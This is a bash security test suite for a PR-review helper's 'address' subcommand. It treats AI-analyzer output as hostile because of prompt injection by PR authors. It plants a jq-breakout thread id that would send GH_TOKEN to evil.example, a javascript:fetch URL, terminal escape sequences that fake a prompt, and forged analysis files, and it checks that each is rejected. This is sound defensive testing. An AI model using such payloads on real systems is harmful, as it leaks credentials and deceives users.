#!/bin/bash
# Security tests for the `address` subcommand.
#
# Selected and legacy analysis files are analyzer output, and analyzers read PR content. A
# PR author who prompt-injects the analyzer controls the strings in that file, so
# every value taken from it must be treated as hostile — particularly the thread
# ids, which reach a jq program and then a browser.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
GH_PR_ENRICH="$PROJECT_DIR/gh-pr-enrich"
TEST_OUTPUT_DIR="$SCRIPT_DIR/test-output/address-security"
STUB_DIR="$TEST_OUTPUT_DIR/stubs"
OPENED_LOG="$TEST_OUTPUT_DIR/opened-urls.txt"

# shellcheck source=lib/assert.sh
source "$SCRIPT_DIR/lib/assert.sh"

cleanup() { rm -rf "$TEST_OUTPUT_DIR"; }
trap cleanup EXIT
cleanup
mkdir -p "$STUB_DIR"

suite_start "gh pr-enrich address security suite"

# Stub the browser openers so a test can never launch one, and record what would
# have been opened.
for opener in open xdg-open; do
    cat > "$STUB_DIR/$opener" << 'STUB'
#!/bin/bash
printf '%s\n' "$1" >> "$OPENED_URLS_LOG"
STUB
    chmod +x "$STUB_DIR/$opener"
done

cat > "$STUB_DIR/gh" << 'STUB'
#!/bin/bash
case "$1 $2" in
    "pr view")
        if [ -n "${GH_WORKSPACE_MUTATION:-}" ]; then
            printf 'changed during hosted verification\n' >> "$GH_WORKSPACE_MUTATION"
            echo '{"headRefOid":"captured-head"}'
        elif [ "${GH_HEAD_MODE:-}" = "captured" ]; then
            echo '{"headRefOid":"captured-head"}'
        elif [ "${GH_HEAD_MODE:-}" = "advance_after_mutation" ] && \
           [ ! -s "$GH_MUTATIONS_LOG" ]; then
            echo '{"headRefOid":"captured-head"}'
        else
            echo '{"headRefOid":"new-hosted-head"}'
        fi
        exit 0
        ;;
    "api graphql")
        case "$*" in
            *"unresolveReviewThread"*)
                for arg in "$@"; do
                    case "$arg" in
                        threadId=*)
                            printf 'unresolve:%s\n' "${arg#threadId=}" >> "$GH_MUTATIONS_LOG"
                            ;;
                    esac
                done
                echo '{"data":{"unresolveReviewThread":{"thread":{"isResolved":false}}}}'
                exit 0
                ;;
            *"resolveReviewThread"*)
                for arg in "$@"; do
                    case "$arg" in
                        threadId=*) printf '%s\n' "$arg" >> "$GH_MUTATIONS_LOG" ;;
                    esac
                done
                if [ "${GH_RESOLVE_MODE:-}" = "applied_nonzero" ]; then
                    echo 'transport failed after apply' >&2
                    exit 1
                fi
                if [ "${GH_RESOLVE_MODE:-}" = "applied_malformed" ]; then
                    echo 'not-json-after-apply'
                    exit 0
                fi
                echo '{"data":{"resolveReviewThread":{"thread":{"isResolved":true}}}}'
                exit 0
                ;;
            *"PullRequestReviewThread"*)
                thread_id=""
                for arg in "$@"; do
                    case "$arg" in threadId=*) thread_id="${arg#threadId=}" ;; esac
                done
                resolved=false
                comments='[]'
                has_next_page=false
                [ "${GH_LIVE_INCOMPLETE:-}" != true ] || has_next_page=true
                if [ -n "${GH_MUTATIONS_LOG:-}" ] && \
                   grep -q "^threadId=$thread_id$" "$GH_MUTATIONS_LOG" 2>/dev/null && \
                   ! grep -q "^unresolve:$thread_id$" "$GH_MUTATIONS_LOG" 2>/dev/null; then
                    resolved=true
                    if [ "${GH_REPLY_AFTER_MUTATION:-}" = true ]; then
                        comments='[{"id":"PRRC_reply","databaseId":2,"author":{"login":"reviewer"},"createdAt":"2026-01-02T00:00:00Z","lastEditedAt":null,"url":"https://github.com/o/r/pull/999#discussion_r2"}]'
                    fi
                fi
                jq -n --arg thread_id "$thread_id" --argjson resolved "$resolved" \
                    --argjson has_next_page "$has_next_page" \
                    --argjson comments "$comments" '{data:{node:{
                        __typename:"PullRequestReviewThread",id:$thread_id,
                        isResolved:$resolved,comments:{pageInfo:{
                            hasNextPage:$has_next_page,endCursor:null},nodes:$comments}}}}'
                exit 0
                ;;
        esac
        for arg in "$@"; do
            case "$arg" in
                threadId=*) printf '%s\n' "$arg" >> "$GH_MUTATIONS_LOG" ;;
            esac
        done
        echo '{"data":{"resolveReviewThread":{"thread":{"isResolved":true}}}}'
        exit 0
        ;;
esac
exit 1
STUB
chmod +x "$STUB_DIR/gh"

# Give address a current provider-neutral selection. Strict mutation consumers
# no longer accept metadata-less legacy reports, even for task display.
write_current_selection() {
    local ws="$1"
    local source_file="$2"
    local thread_id="${3:-}"
    local report_dir="$ws/.reports/pr-reviews/pr-999"
    local context_file="$report_dir/analysis-context.json"
    local context_fingerprint

    jq -n --arg tid "$thread_id" '{
        pr: {repository:"o/r", number:999},
        unresolved_threads: (if ($tid | test("^PRRT_[A-Za-z0-9_-]+$"))
            then [{thread_id:$tid,comments_complete:true,comment_identity:[]}]
            else [] end),
        coverage: {code_access:{state:"disabled", pr_head_sha:"captured-head"}}
    }' > "$context_file"
    context_fingerprint=$("$GH_PR_ENRICH" --test-call \
        analysis_context_fingerprint "$context_file")
    jq --arg fingerprint "$context_fingerprint" \
        '.coverage.context_fingerprint = $fingerprint' "$context_file" \
        > "$context_file.tmp"
    mv "$context_file.tmp" "$context_file"
    jq --arg fingerprint "$context_fingerprint" '. + {_metadata:{
        provider:"claude", repository:"o/r", pr_number:999,
        pr_head_sha:"captured-head", context_fingerprint:$fingerprint
    }}' "$source_file" > "$report_dir/analysis.json"
    rm -f "$source_file"
}

# Build a workspace with a hostile analysis file and run `address` in it.
# $1 = thread id planted in analysis.json
# $2 = url planted in comment-threads.json for the benign id
run_address() {
    local thread_id="$1"
    local planted_url="${2:-https://github.com/o/r/pull/999#discussion_r1}"
    local ws="$TEST_OUTPUT_DIR/ws"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    : > "$OPENED_LOG"

    jq -n --arg tid "$thread_id" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [],
        task_list: [{
            priority: "high", task: "Task under test", thread_ids: [$tid],
            file: "a.js", line: 1, suggested_fix: "fix", verification: "npm test"
        }],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"

    write_current_selection "$ws" \
        "$ws/.reports/pr-reviews/pr-999/claude-analysis.json" "$thread_id"

    jq -n --arg url "$planted_url" '{
        data: {repository: {pullRequest: {reviewThreads: {nodes: [
            {id: "PRRT_benign", isResolved: false,
             comments: {nodes: [{url: $url}]}}
        ]}}}}
    }' > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    # "o" opens the thread, "q" quits the loop.
    printf 'oq' | (cd "$ws" && env OPENED_URLS_LOG="$OPENED_LOG" PATH="$STUB_DIR:$PATH" \
        "$GH_PR_ENRICH" address 999 2>&1) || true
}

# ---------------------------------------------------------------------------
# jq program-string breakout
#
# The id closes the interpolated string literal and supplies its own program,
# synthesizing a URL of the attacker's choosing (and jq can read $ENV, so the
# same hole leaks environment variables).
# ---------------------------------------------------------------------------
EXFIL='x") | ("https://evil.example/?leak=" + ($ENV.GH_TOKEN // "none")) // ("'
OUT=$(run_address "$EXFIL")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")

assert_not_contains "$OPENED" "evil.example" "a jq-breakout thread id cannot open an attacker URL"
assert_not_contains "$OPENED" "GH_TOKEN" "environment variables cannot be exfiltrated through the URL"
assert_contains "$OUT" "Analysis not found" "the malformed thread id is rejected before task display"

# A plain quote is enough to corrupt the program even without a payload.
OUT=$(run_address 'PRRT_abc" or "1"=="1')
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a quoted thread id opens nothing"

# ---------------------------------------------------------------------------
# The feature still works for a legitimate id
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_contains "$OPENED" "https://github.com/o/r/pull/999#discussion_r1" \
    "a valid thread id still opens its comment URL"

# ---------------------------------------------------------------------------
# The URL itself is checked before it reaches the opener
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign" "javascript:fetch('https://evil.example')")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a non-https URL is never handed to the browser"

OUT=$(run_address "PRRT_benign" "https://evil.example/phish")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a URL outside GitHub is never handed to the browser"

# ---------------------------------------------------------------------------
# Terminal escape sequences in analyzer output
#
# Task text is printed straight to the user's terminal. Escape sequences there
# can repaint the screen, hide text, or fake the tool's own prompts — so an
# injected analysis could misrepresent what the user is approving.
# ---------------------------------------------------------------------------
run_address_with_task() {
    local task_json="$1"
    local ws="$TEST_OUTPUT_DIR/ws-term"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    jq -n --argjson task "$task_json" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [], task_list: [$task],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"
    write_current_selection "$ws" \
        "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"
    echo '{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[]}}}}}' \
        > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    printf 'q' | (cd "$ws" && env PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true
}

#  is a real escape byte once jq -r decodes it.
HOSTILE_TASK=$(jq -n '{
    priority: "high[2J[H",
    task: "Harmless looking[31m FAKE PROMPT: [y]es to grant admin",
    thread_ids: [],
    file: "a.js", line: 1,
    suggested_fix: "fix[1;32m",
    verification: "npm test[0m"
}')

TERM_OUT=$(run_address_with_task "$HOSTILE_TASK")

# The payload's printable remainder ("[2J") is harmless; what matters is that no
# ESC byte survives to be interpreted by the terminal.
if printf '%s' "$TERM_OUT" | grep -q $'\033\\[2J'; then
    fail "screen-clearing escape from analyzer output is neutralized" "a raw ESC[2J reached the terminal"
else
    pass "screen-clearing escape from analyzer output is neutralized"
fi

if printf '%s' "$TERM_OUT" | grep -q $'\033\\[31m FAKE PROMPT'; then
    fail "color escapes in task text are neutralized" "a raw ESC[31m reached the terminal"
else
    pass "color escapes in task text are neutralized"
fi

assert_contains "$TERM_OUT" "FAKE PROMPT" "the task text itself is still shown to the user"

# A current provider source can remain on disk after selection rejects it. The
# address workflow must not consume it through the pre-v2.1 legacy fallback.
CURRENT_SOURCE_WS="$TEST_OUTPUT_DIR/ws-current-source"
mkdir -p "$CURRENT_SOURCE_WS/.reports/pr-reviews/pr-999"
jq -n '{
    issue_categories: [], category_coverage: [], disputed_comments: [],
    systemic_issues: [], adjacent_problems: [],
    task_list: [{priority:"high",task:"REJECTED CURRENT TASK",thread_ids:[],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements: [], pr_template_suggestions: [],
    _metadata: {provider:"claude",pr_head_sha:"head",context_fingerprint:"sha256:fixture"}
}' > "$CURRENT_SOURCE_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
CURRENT_SOURCE_OUT=$( (cd "$CURRENT_SOURCE_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$CURRENT_SOURCE_OUT" "Analysis not found" \
    "address refuses a current Claude source that was not selected"
assert_not_contains "$CURRENT_SOURCE_OUT" "REJECTED CURRENT TASK" \
    "address never presents tasks from a rejected current provider source"

# analysis.json did not exist before the v2.1 selection workflow. A branch must
# not be able to plant a metadata-less file under the selected name and have an
# address run consume it without context, provenance, or selection validation.
PLANTED_SELECTED_WS="$TEST_OUTPUT_DIR/ws-planted-selected"
mkdir -p "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999"
jq -n '{
    issue_categories: [], category_coverage: [], disputed_comments: [],
    systemic_issues: [], adjacent_problems: [],
    task_list: [{priority:"high",task:"BRANCH PLANTED TASK",thread_ids:[],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements: [], pr_template_suggestions: []
}' > "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json"
(cd "$PLANTED_SELECTED_WS" && git init -q . && git config user.email t@t && \
    git config user.name t && git add -A && git commit -qm init)
PLANTED_SELECTED_OUT=$( (cd "$PLANTED_SELECTED_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$PLANTED_SELECTED_OUT" "Analysis not found" \
    "address rejects a branch-tracked metadata-less selected result"
assert_not_contains "$PLANTED_SELECTED_OUT" "BRANCH PLANTED TASK" \
    "address never presents tasks from a planted selected result"

TRACKED_LEGACY_WS="$TEST_OUTPUT_DIR/ws-tracked-legacy"
mkdir -p "$TRACKED_LEGACY_WS/.reports/pr-reviews/pr-999"
cp "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json" \
    "$TRACKED_LEGACY_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
(cd "$TRACKED_LEGACY_WS" && git init -q . && git config user.email t@t && \
    git config user.name t && git add -A && git commit -qm init)
TRACKED_LEGACY_OUT=$( (cd "$TRACKED_LEGACY_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$TRACKED_LEGACY_OUT" "Analysis not found" \
    "address rejects a branch-tracked legacy analysis"

SYMLINK_LEGACY_WS="$TEST_OUTPUT_DIR/ws-symlink-legacy"
mkdir -p "$SYMLINK_LEGACY_WS/.reports/pr-reviews/pr-999"
cp "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json" \
    "$SYMLINK_LEGACY_WS/legacy-target.json"
ln -s ../../../legacy-target.json \
    "$SYMLINK_LEGACY_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
SYMLINK_LEGACY_OUT=$( (cd "$SYMLINK_LEGACY_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$SYMLINK_LEGACY_OUT" "Analysis not found" \
    "address rejects a symlinked legacy analysis"

# Revalidate immediately before hosted mutation. A selection valid at head A
# cannot resolve threads after the PR advances to head B.
STALE_MUTATION_WS="$TEST_OUTPUT_DIR/ws-stale-mutation"
STALE_MUTATION_REPORT="$STALE_MUTATION_WS/.reports/pr-reviews/pr-999"
MUTATION_LOG="$STALE_MUTATION_WS/mutations.log"
mkdir -p "$STALE_MUTATION_REPORT"
jq -n '{pr:{repository:"o/r",number:999},
    unresolved_threads:[
        {thread_id:"PRRT_stale",comments_complete:true,comment_identity:[]},
        {thread_id:"PRRT_first",comments_complete:true,comment_identity:[]},
        {thread_id:"PRRT_second",comments_complete:true,comment_identity:[]}],
    coverage:{code_access:{pr_head_sha:"captured-head"}}}' \
    > "$STALE_MUTATION_REPORT/analysis-context.tmp.json"
STALE_FINGERPRINT=$("$GH_PR_ENRICH" --test-call analysis_context_fingerprint \
    "$STALE_MUTATION_REPORT/analysis-context.tmp.json")
jq --arg fingerprint "$STALE_FINGERPRINT" '.coverage.context_fingerprint = $fingerprint' \
    "$STALE_MUTATION_REPORT/analysis-context.tmp.json" \
    > "$STALE_MUTATION_REPORT/analysis-context.json"
jq -n --arg fingerprint "$STALE_FINGERPRINT" '{
    task_list:[{priority:"high",task:"STALE TASK",thread_ids:["PRRT_stale"],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    _metadata:{provider:"codex",repository:"o/r",pr_number:999,
        pr_head_sha:"captured-head",context_fingerprint:$fingerprint}
}' > "$STALE_MUTATION_REPORT/analysis.json"
STALE_BATCH_TEMPLATE="$TEST_OUTPUT_DIR/stale-batch-analysis.json"
cp "$STALE_MUTATION_REPORT/analysis.json" "$STALE_BATCH_TEMPLATE"
: > "$MUTATION_LOG"
INCOMPLETE_THREAD_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_HEAD_MODE=captured GH_LIVE_INCOMPLETE=true \
    GH_MUTATIONS_LOG="$MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$INCOMPLETE_THREAD_OUT" "could not be fetched completely" \
    "address rejects a live discussion whose complete comments were not fetched"
assert_eq "" "$(cat "$MUTATION_LOG")" \
    "an incomplete live discussion sends no resolution mutation"
cp "$STALE_BATCH_TEMPLATE" "$STALE_MUTATION_REPORT/analysis.json"
: > "$MUTATION_LOG"
STALE_MUTATION_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_MUTATIONS_LOG="$MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$STALE_MUTATION_OUT" "Hosted PR head changed" \
    "address refuses hosted mutation after the PR head advances"
assert_eq "" "$(cat "$MUTATION_LOG")" \
    "a stale selected analysis sends no thread-resolution mutation"
assert_true "$([ ! -e "$STALE_MUTATION_REPORT/analysis.json" ] && echo 0 || echo 1)" \
    "a stale address run invalidates the selected artifact"

jq -n --arg fingerprint "$STALE_FINGERPRINT" '{
    task_list:[{priority:"high",task:"BATCH TASK",
        thread_ids:["PRRT_first","PRRT_second"],file:"a.js",line:1,
        suggested_fix:"fix",verification:"test"}],
    _metadata:{provider:"codex",repository:"o/r",pr_number:999,
        pr_head_sha:"captured-head",context_fingerprint:$fingerprint}
}' > "$STALE_MUTATION_REPORT/analysis.json"
: > "$MUTATION_LOG"
BATCH_MUTATION_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_HEAD_MODE=advance_after_mutation GH_MUTATIONS_LOG="$MUTATION_LOG" \
    PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$BATCH_MUTATION_OUT" "reopened PRRT_first" \
    "a head change during mutation compensates by reopening the thread"
assert_not_contains "$BATCH_MUTATION_OUT" "Resolved: PRRT_first" \
    "a compensated head-race resolution is not reported as successful"
assert_eq "2" "$(wc -l < "$MUTATION_LOG" | tr -d ' ')" \
    "a head race sends one resolve and one compensating unresolve mutation"
assert_not_contains "$(cat "$MUTATION_LOG")" "PRRT_second" \
    "a head race blocks all later thread mutations"

# The hosted-head read is itself a trust boundary. If the local tree changes
# during that read, the final workspace check must reject the selected result
# before resolveReviewThread is sent.
LOCAL_MUTATION_WS="$TEST_OUTPUT_DIR/ws-local-mutation"
LOCAL_MUTATION_REPORT="$LOCAL_MUTATION_WS/.reports/pr-reviews/pr-999"
LOCAL_MUTATION_CONTEXT_TMP="$TEST_OUTPUT_DIR/local-mutation-context.tmp.json"
LOCAL_MUTATION_LOG="$TEST_OUTPUT_DIR/local-mutation.log"
mkdir -p "$LOCAL_MUTATION_WS"
(cd "$LOCAL_MUTATION_WS" && git init -q . && git config user.email t@t && \
    git config user.name t)
printf 'stable\n' > "$LOCAL_MUTATION_WS/base.txt"
(cd "$LOCAL_MUTATION_WS" && git add base.txt && git commit -qm init)
mkdir -p "$LOCAL_MUTATION_REPORT"
LOCAL_WORKSPACE_FINGERPRINT=$(cd "$LOCAL_MUTATION_WS" && \
    "$GH_PR_ENRICH" --test-call code_access_workspace_fingerprint \
        .reports/pr-reviews/pr-999)
jq -n --arg workspace_fingerprint "$LOCAL_WORKSPACE_FINGERPRINT" \
    '{pr:{repository:"o/r",number:999},
    unresolved_threads:[{thread_id:"PRRT_local",comments_complete:true,
        comment_identity:[]}],coverage:{code_access:{
        state:"enabled",pr_head_sha:"captured-head",
        workspace_fingerprint:$workspace_fingerprint}}}' \
    > "$LOCAL_MUTATION_CONTEXT_TMP"
LOCAL_CONTEXT_FINGERPRINT=$("$GH_PR_ENRICH" --test-call analysis_context_fingerprint \
    "$LOCAL_MUTATION_CONTEXT_TMP")
jq --arg fingerprint "$LOCAL_CONTEXT_FINGERPRINT" \
    '.coverage.context_fingerprint = $fingerprint' \
    "$LOCAL_MUTATION_CONTEXT_TMP" > "$LOCAL_MUTATION_REPORT/analysis-context.json"
jq -n --arg fingerprint "$LOCAL_CONTEXT_FINGERPRINT" \
    --arg workspace_fingerprint "$LOCAL_WORKSPACE_FINGERPRINT" '{
    issue_categories:[{name:"correctness",severity:"high",verdict:"confirmed"}],
    task_list:[{priority:"high",task:"LOCAL MUTATION TASK",
        thread_ids:["PRRT_local"],file:"base.txt",line:1,
        suggested_fix:"fix",verification:"test"}],
    _metadata:{provider:"codex",repository:"o/r",pr_number:999,
        pr_head_sha:"captured-head",context_fingerprint:$fingerprint,
        workspace_fingerprint:$workspace_fingerprint}
}' > "$LOCAL_MUTATION_REPORT/analysis.json"
LOCAL_CONTEXT_TEMPLATE="$TEST_OUTPUT_DIR/local-context-template.json"
LOCAL_ANALYSIS_TEMPLATE="$TEST_OUTPUT_DIR/local-analysis-template.json"
cp "$LOCAL_MUTATION_REPORT/analysis-context.json" "$LOCAL_CONTEXT_TEMPLATE"
cp "$LOCAL_MUTATION_REPORT/analysis.json" "$LOCAL_ANALYSIS_TEMPLATE"
: > "$LOCAL_MUTATION_LOG"
LOCAL_MUTATION_OUT=$(printf 'f' | (cd "$LOCAL_MUTATION_WS" && \
    env GH_WORKSPACE_MUTATION="$LOCAL_MUTATION_WS/base.txt" \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$LOCAL_MUTATION_OUT" "State changed during resolution" \
    "address detects a workspace mutation during final hosted-head verification"
assert_contains "$(cat "$LOCAL_MUTATION_LOG")" "threadId=PRRT_local" \
    "a mutation occurring inside the final head check is detected post-resolution"
assert_contains "$(cat "$LOCAL_MUTATION_LOG")" "unresolve:PRRT_local" \
    "a last-moment workspace mutation is compensated by reopening the thread"
assert_true "$([ ! -e "$LOCAL_MUTATION_REPORT/analysis.json" ] && echo 0 || echo 1)" \
    "a last-moment workspace mutation invalidates the selected artifact"

# A same-head reply posted while resolveReviewThread is in flight is concurrent
# reviewer-owned state. Invalidate locally, but never overwrite it by reopening.
git -C "$LOCAL_MUTATION_WS" checkout -- base.txt
cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
: > "$LOCAL_MUTATION_LOG"
SAME_HEAD_REPLY_OUT=$(printf 'f' | (cd "$LOCAL_MUTATION_WS" && \
    env GH_HEAD_MODE=captured GH_REPLY_AFTER_MUTATION=true \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$SAME_HEAD_REPLY_OUT" "reviewer-owned state changed" \
    "a same-head reply during mutation requires manual reconciliation"
assert_not_contains "$(cat "$LOCAL_MUTATION_LOG")" "unresolve:PRRT_local" \
    "same-head discussion drift does not overwrite concurrent reviewer state"
assert_not_contains "$SAME_HEAD_REPLY_OUT" "Resolved: PRRT_local" \
    "same-head discussion drift is not reported as successful resolution"

# A failed or malformed GraphQL response is ambiguous because GitHub can apply
# the mutation before the transport fails. Live captured identity resolves that
# ambiguity and still runs the normal post-mutation validation.
for RESOLVE_MODE in applied_nonzero applied_malformed; do
    git -C "$LOCAL_MUTATION_WS" checkout -- base.txt
    cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
    cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
    : > "$LOCAL_MUTATION_LOG"
    AMBIGUOUS_APPLY_OUT=$(printf 'f' | (cd "$LOCAL_MUTATION_WS" && \
        env GH_HEAD_MODE=captured GH_RESOLVE_MODE="$RESOLVE_MODE" \
        GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
        "$GH_PR_ENRICH" address 999 2>&1) || true)
    assert_contains "$AMBIGUOUS_APPLY_OUT" "Resolved: PRRT_local" \
        "$RESOLVE_MODE is accepted only after live state proves application"
    assert_not_contains "$(cat "$LOCAL_MUTATION_LOG")" "unresolve:PRRT_local" \
        "$RESOLVE_MODE does not compensate a verified stable resolution"
done

# Freeze the bytes the operator reviewed. A valid same-provenance replacement
# while the prompt is open must not change the task that is later authorized.
git -C "$LOCAL_MUTATION_WS" checkout -- base.txt
cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
ANALYSIS_RACE_FIFO="$TEST_OUTPUT_DIR/analysis-race.fifo"
ANALYSIS_RACE_OUT_FILE="$TEST_OUTPUT_DIR/analysis-race.out"
rm -f "$ANALYSIS_RACE_FIFO"
mkfifo "$ANALYSIS_RACE_FIFO"
: > "$ANALYSIS_RACE_OUT_FILE"
: > "$LOCAL_MUTATION_LOG"
exec 3<> "$ANALYSIS_RACE_FIFO"
(cd "$LOCAL_MUTATION_WS" && env GH_HEAD_MODE=captured \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 < "$ANALYSIS_RACE_FIFO" \
    > "$ANALYSIS_RACE_OUT_FILE" 2>&1) &
ANALYSIS_RACE_PID=$!
for _attempt in $(seq 1 100); do
    grep -q '\[f\]ixed' "$ANALYSIS_RACE_OUT_FILE" 2>/dev/null && break
    sleep 0.02
done
jq '.task_list[0].task = "REPLACED AFTER DISPLAY"' \
    "$LOCAL_ANALYSIS_TEMPLATE" > "$LOCAL_MUTATION_REPORT/analysis.json"
printf 'f' >&3
exec 3>&-
wait "$ANALYSIS_RACE_PID" || true
ANALYSIS_RACE_OUT=$(cat "$ANALYSIS_RACE_OUT_FILE")
assert_contains "$ANALYSIS_RACE_OUT" "LOCAL MUTATION TASK" \
    "address displays tasks from its private frozen analysis"
assert_contains "$ANALYSIS_RACE_OUT" "Selected analysis or thread provenance changed" \
    "address rejects selected-analysis replacement while the prompt is open"
assert_eq "" "$(cat "$LOCAL_MUTATION_LOG")" \
    "analysis replacement sends no thread-resolution mutation"

# A self-consistent context refresh while the prompt is open also invalidates
# the selected metadata binding before any GraphQL mutation.
cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"
CONTEXT_RACE_TMP="$TEST_OUTPUT_DIR/address-context-race.tmp.json"
CONTEXT_RACE_REPLACEMENT="$TEST_OUTPUT_DIR/address-context-race.json"
jq 'del(.coverage.context_fingerprint)
    | .unresolved_threads = [{thread_id:"PRRT_from_another_pr",
        comments_complete:true,comment_identity:[]}]' \
    "$LOCAL_CONTEXT_TEMPLATE" > "$CONTEXT_RACE_TMP"
ADDRESS_CONTEXT_RACE_FINGERPRINT=$("$GH_PR_ENRICH" --test-call \
    analysis_context_fingerprint "$CONTEXT_RACE_TMP")
jq --arg fingerprint "$ADDRESS_CONTEXT_RACE_FINGERPRINT" \
    '.coverage.context_fingerprint = $fingerprint' \
    "$CONTEXT_RACE_TMP" > "$CONTEXT_RACE_REPLACEMENT"
CONTEXT_RACE_FIFO="$TEST_OUTPUT_DIR/context-race.fifo"
CONTEXT_RACE_OUT_FILE="$TEST_OUTPUT_DIR/context-race.out"
rm -f "$CONTEXT_RACE_FIFO"
mkfifo "$CONTEXT_RACE_FIFO"
: > "$CONTEXT_RACE_OUT_FILE"
: > "$LOCAL_MUTATION_LOG"
exec 4<> "$CONTEXT_RACE_FIFO"
(cd "$LOCAL_MUTATION_WS" && env GH_HEAD_MODE=captured \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 < "$CONTEXT_RACE_FIFO" \
    > "$CONTEXT_RACE_OUT_FILE" 2>&1) &
CONTEXT_RACE_PID=$!
for _attempt in $(seq 1 100); do
    grep -q '\[f\]ixed' "$CONTEXT_RACE_OUT_FILE" 2>/dev/null && break
    sleep 0.02
done
cp "$CONTEXT_RACE_REPLACEMENT" "$LOCAL_MUTATION_REPORT/analysis-context.json"
printf 'f' >&4
exec 4>&-
wait "$CONTEXT_RACE_PID" || true
CONTEXT_RACE_OUT=$(cat "$CONTEXT_RACE_OUT_FILE")
assert_contains "$CONTEXT_RACE_OUT" "Selected analysis or thread provenance changed" \
    "address rejects context replacement while the prompt is open"
assert_eq "" "$(cat "$LOCAL_MUTATION_LOG")" \
    "context replacement sends no thread-resolution mutation"

suite_end
